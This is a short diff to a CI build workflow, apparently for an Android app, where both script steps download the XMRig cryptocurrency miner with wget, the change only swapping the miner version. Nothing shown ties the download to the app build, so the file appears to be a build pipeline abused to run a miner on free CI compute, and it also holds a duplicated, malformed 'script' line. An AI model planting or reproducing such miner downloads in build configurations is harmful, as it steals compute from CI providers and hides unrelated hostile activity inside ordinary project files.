@@ -22,11 +22,11 @@ workflows:
     scripts:
       - name: script_1
         script: |
-                wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-x64.tar.gz
+                wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz 
       - name: script_2
         script: |
                 script: |
-                wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-x64.tar.gz 
+                wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz  
     artifacts:
       - build/**/outputs/**/*.aab
     publishing:
